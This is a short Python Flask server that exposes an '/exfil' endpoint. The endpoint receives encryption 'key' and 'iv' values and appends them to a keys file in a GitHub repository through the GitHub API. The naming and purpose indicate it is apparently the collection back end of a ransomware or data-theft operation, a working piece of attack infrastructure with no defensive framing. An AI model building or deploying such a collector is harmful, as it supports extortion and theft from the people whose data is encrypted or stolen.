import os
import base64
import requests
from flask import Flask, request

app = Flask(__name__)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
REPO = "https://github.com/Mridul01154/Catch.git" 
FILEPATH = "data/keys.txt"

def update_github_file(content):
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    # Get current file info (needed for SHA)
    url = f"https://api.github.com/repos/{REPO}/contents/{FILEPATH}"
    res = requests.get(url, headers=headers)
    data = res.json()
    sha = data['sha']
    old_content = base64.b64decode(data['content']).decode()

    # Append new entry
    new_content = old_content + content
    encoded = base64.b64encode(new_content.encode()).decode()

    update_data = {
        "message": "Log new key + iv",
        "content": encoded,
        "sha": sha
    }

    put_res = requests.put(url, headers=headers, json=update_data)
    return put_res.status_code

@app.route("/exfil", methods=["POST"])
def exfil():
    key = request.form.get("key")
    iv = request.form.get("iv")
    if key and iv:
        block = f"KEY={key}\nIV={iv}\n---\n"
        update_github_file(block)
        return "Logged", 200
    return "Missing key/iv", 400

if __name__ == "__main__":
    app.run()
